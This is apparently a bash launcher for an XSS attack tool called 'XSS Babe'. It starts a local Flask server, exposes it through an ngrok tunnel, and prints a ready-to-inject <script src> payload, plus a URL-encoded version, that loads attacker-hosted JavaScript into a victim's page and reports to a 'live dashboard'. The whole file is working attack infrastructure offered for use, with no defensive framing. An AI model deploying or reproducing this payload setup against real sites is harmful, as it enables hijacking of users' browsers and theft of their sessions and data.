#!/bin/bash

# XSS Babe + Ngrok Launcher
echo "[+] Starting XSS Babe server on port 5000..."
python3 server.py &

# Wait a sec for Flask to boot
sleep 2

echo "[+] Launching Ngrok tunnel..."
./ngrok http 5000 > /dev/null &

# Wait for ngrok to initialize
sleep 3

# Fetch the public ngrok URL
NGROK_URL=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^"]*')

if [[ -z "$NGROK_URL" ]]; then
    echo "[-] Failed to retrieve Ngrok URL. Is Ngrok running?"
    exit 1
fi

echo "[+] Ngrok is live at: $NGROK_URL"
echo
echo "[✓] Inject this payload in your XSS vector:"
echo "<script src=\"$NGROK_URL/static/x.js\"></script>"
echo
echo "[✓] URL-encoded payload:"
ENCODED=$(echo -n "<script src=\"$NGROK_URL/static/x.js\"></script>" | jq -s -R -r @uri)
echo "$ENCODED"
echo
echo "[+] Live dashboard: $NGROK_URL/"
